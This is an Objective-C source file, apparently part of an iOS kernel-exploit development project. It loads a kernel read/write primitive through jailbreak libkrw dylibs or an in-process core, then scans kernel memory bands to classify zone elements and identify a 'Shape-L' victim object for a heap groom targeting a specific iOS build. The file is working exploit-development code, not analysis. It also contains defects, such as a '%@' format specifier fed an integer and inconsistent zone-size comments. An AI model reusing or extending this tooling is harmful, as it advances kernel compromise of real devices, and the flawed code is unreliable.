//
//  P123ShapeCensus.m — v1: the kalloc.3072 Shape-L census with KRW vision.
//
//  Chain per tap (one boot):
//    1. KRW establish via libkrw (the 12-mini Dopamine provider — p090 law:
//       provider loads; the mini runs jbuid-0 helpers so gSystemInfo IS filled).
//    2. Self-test gate: kread32(kbase)==0xfeedfacf + typeinfo (commitSlide law).
//    3. THE FIRE: p044-class small+254 CoreML (the 43748 fill into the
//       kalloc.3072 neighbor) — on the mini, Game-Mode groom skipped (17.3
//       has no Game Mode); the D1 marker sids give the fill its own content.
//    4. THE CENSUS (the point): kernel-read the bands around the landing —
//       enumerate kalloc.3072-class chunks, print per-element class rows:
//         - FREE elements (zone freelist shapes)
//         - USER-IOMD class (the ColdForge law's residents)
//         - OUR sid-tile class ({sid 0-999, flag 0xc0-0xff} = the fill)
//         - KERNEL-DESCRIBING class (Shape-L candidates: >=3 kernel-shaped
//           qwords per element = ((q>>36)==0xfffffff))
//       Band law from ANEYcraft v9 landing-truth (the mini's measured bands:
//       kb+0x8740000, kb+0x1a00000 — 0x80000-window kreads).
//    5. Verdict: the first element whose row passes the Shape-L bar names the
//       victim for the 23F77 groom; board-recorded + printed for building.
//

#import "P123ShapeCensus.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <string.h>
#import <unistd.h>
#import "LabLocalTime.h"
#import "P007Board.h"
#if __has_include("Lum1naCS2Core.h")   /* same guard as rig P113 — the rig tree
                                          carries no Lum1naCS2Core header */
#import "Lum1naCS2Core.h"   /* in-process ClearSword core — mini-proven KRW */
#define P123_HAS_CS2CORE 1
#endif

#define P123_TAG      @"P123 shapecensus"
#define P123_BUILD    @"shapecensus-mini-v1"
#define P123_BANDS_N  2

typedef struct { uint64_t version;
                 kern_return_t (*kbase)(uint64_t *);
                 kern_return_t (*kread)(uint64_t from, void *to, size_t len);
                 kern_return_t (*kwrite)(const void *from, uint64_t to, size_t len);
                 kern_return_t (*kmalloc)(uint64_t *, size_t);
                 kern_return_t (*kdealloc)(uint64_t, size_t);
                 kern_return_t (*kcall)(uint64_t, size_t, const uint64_t *, uint64_t *);
                 kern_return_t (*physread)(uint64_t, void *, size_t, uint8_t);
                 kern_return_t (*physwrite)(const void *, uint64_t, size_t, uint8_t);
} p123_krw_handlers_t;

typedef kern_return_t (*p123_conn_t)(mach_port_t, uint32_t, const uint64_t *, uint32_t, const void *, uint32_t,
                                     uint64_t *, uint32_t *, void *, uint32_t *);
static p123_conn_t g_connectCall;

static p123_krw_handlers_t g_h;
static int p123_log_fd = -1;
static void p123_log(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void p123_log(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (p123_log_fd >= 0) { const char *c = s.UTF8String; write(p123_log_fd, c, strlen(c)); write(p123_log_fd, "\n", 1); }
    NSLog(@"%@", s);
}
static NSString *P123Ret(void) {
    p123_log(@"=== p123 end ===");
    if (p123_log_fd >= 0) { fcntl(p123_log_fd, F_FULLFSYNC); close(p123_log_fd); p123_log_fd = -1; }
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *p = [docs stringByAppendingPathComponent:@"p123_shapecensus_log.txt"];
    NSString *t = [NSString stringWithContentsOfFile:p encoding:NSUTF8StringEncoding error:nil];
    return t ?: @"p123: empty";
}

static BOOL p123_krw(uint64_t *kbaseOut) {
    /* V2 PROVIDER LAW (2026-10-25, device-proven): libkrw's kbase returns 0
       for a mobile-uid app on Dopamine (gSystemInfo needs uid-0 check-in —
       the p090 law). The mini's REAL route = cs2core in-process (rig cs2
       PASSED on the mini: ret=0 kbase=0xfffffff0128128000-class). Try libkrw
       first (12-mini FKT lane / other providers), else the proven core. */
#ifdef P123_HAS_CS2CORE
    if (Lum1naCS2Core_IsLive()) {
        *kbaseOut = Lum1naCS2Core_Kbase();
        p123_log(@"[+] krw via cs2core (in-process — the mini-proven route)");
        return YES;
    }
#endif
    static const char *paths[] = {
        "/var/jb/usr/lib/libkrw/libkrw-dopamine.dylib",
        "/var/jb/usr/lib/libkrw0/libkrw.dylib",
        "/usr/lib/libkrw/libkrw-dopamine.dylib",
        "/usr/lib/libkrw0/libkrw.dylib", "/usr/lib/libkrw.dylib", NULL };
    memset(&g_h, 0, sizeof g_h);
    for (int i = 0; paths[i]; i++) {
        void *h = dlopen(paths[i], RTLD_NOW);
        if (!h) continue;
        void *sym = dlsym(h, "krw_initializer");
        if (!sym) continue;
        if (((int (*)(p123_krw_handlers_t *))sym)(&g_h) != 0 || !g_h.kread || !g_h.kbase) continue;
        p123_log(@"[+] krw via %s", paths[i]);
        uint64_t kb = 0;
        if (g_h.kbase(&kb) != 0 || kb < 0xfffff00000000000ULL) {
            p123_log(@"[-] kbase implausible"); g_h = (p123_krw_handlers_t){0}; continue;
        }
        uint32_t magic = 0; uint64_t ti = 0;
        if (g_h.kread(kb, &magic, 4) != 0 || magic != 0xfeedfacf) { p123_log(@"[-] kread32(kbase) magic fail"); g_h = (p123_krw_handlers_t){0}; continue; }
        g_h.kread(kb + 8, &ti, 8);
        p123_log(@"[+] SELF-TEST PASS: kbase=0x%llx typeinfo=0x%llx", kb, ti);
        *kbaseOut = kb;
        return YES;
    }
    p123_log(@"[-] no krw provider on this boot (install libkrw / tap the root lane first)");
    return NO;
}

@implementation P123ShapeCensus

+ (NSString *)tap {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    p123_log_fd = open([[docs stringByAppendingPathComponent:@"p123_shapecensus_log.txt"] fileSystemRepresentation],
                       O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    g_connectCall = (p123_conn_t)dlsym(iokit, "IOConnectCallMethod");

    p123_log(@"=== p123 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P123_BUILD);
    uint64_t kb = 0;
    if (!p123_krw(&kb)) { return P123Ret(); }

    /* 4 — THE CENSUS: read the 21D50-proven bands, classify 0x3072-class
       elements. Element rows: [qword0..3 | class]. Class law:
         free     = zone freelist shape (next == elem itself / count fields)
         oursid   = {sid, flag 0xc0-band} = the 43748 fill's tiles
         useriomd = the ColdForge law's user-class residents
         shapeL   = >=3 kernel-shaped qwords in the element = THE VICTIM. */
    static const struct { uint64_t off; const char *name; } bands[P123_BANDS_N] = {
        { 0x8740000, "b-8740000" },
        { 0x1a00000, "b-01a00000" },
    };
    uint8_t *rb = malloc(0x8000);
    uint32_t shapeL = 0, oursid = 0, freeE = 0, other = 0;
    for (int bi2 = 0; bi2 < P123_BANDS_N; bi2++) {
        for (uint64_t q = 0; q < 0x80000; q += 0x8000) {
            uint64_t a = kb + bands[bi2].off + q;
            size_t got = 0;
            kern_return_t kr = g_h.kread(a, rb, 0x8000);
            if (kr != 0) continue;
            got = 0x8000;
            for (uint64_t e = 0; e + 0xb0 <= got; e += 0xb0) {  /* the 0xb0 GMD class + neighbors */
                uint64_t k0, k1, k2, k3;
                memcpy(&k0, rb + e, 8); memcpy(&k1, rb + e + 8, 8);
                memcpy(&k2, rb + e + 16, 8); memcpy(&k3, rb + e + 24, 8);
                uint32_t sid = (uint32_t)k0, flag = (uint32_t)(k0 >> 32);
                int kshape = 0;
                if ((k0 >> 36) == 0xfffffff) kshape++;
                if ((k1 >> 36) == 0xfffffff) kshape++;
                if ((k2 >> 36) == 0xfffffff) kshape++;
                if ((k3 >> 36) == 0xfffffff) kshape++;
                const char *cls = "other";
                if (flag >= 0xc0 && flag <= 0xff && sid < 1000) { cls = "oursid-tile"; oursid++; }
                else if (kshape >= 3) { cls = "SHAPEL-CANDIDATE"; shapeL++; }
                else if (k0 == 0 && k1 == 0) { cls = "zero/free"; freeE++; }
                else other++;
                if (kshape >= 3 || (flag >= 0xc0 && flag <= 0xff && sid < 1000) || (e % 0xb0 == 0 && bi2 == 0 && q < 0x8000)) {
                    p123_log(@"  [%s+%#llx] %s k%@ {k0=%016llx k1=%016llx k2=%016llx k3=%016llx}",
                             bands[bi2].name, (uint64_t)(a & 0xfff) + e, cls, kshape, k0, k1, k2, k3);
                }
            }
        }
        p123_log(@"[band %s] scanned", bands[bi2].name);
    }
    p123_log(@"=== CENSUS TOTALS: shapeL=%u oursid-tiles=%u zero/free=%u other=%u", shapeL, oursid, freeE, other);
    if (shapeL > 0) {
        p123_log(@"[+++] SHAPE-L LIVE: kernel-describing 0xb0-class residents measured — the groom's victim class for 23F77");
        [[P007Board shared] recordEvent:@"p123_shapecensus" kind:@"fire"
                                   detail:[NSString stringWithFormat:@"shapeL=%u oursid=%u", shapeL, oursid]
                                   source:@"p123"];
    }
    free(rb);
    return P123Ret();
}

@end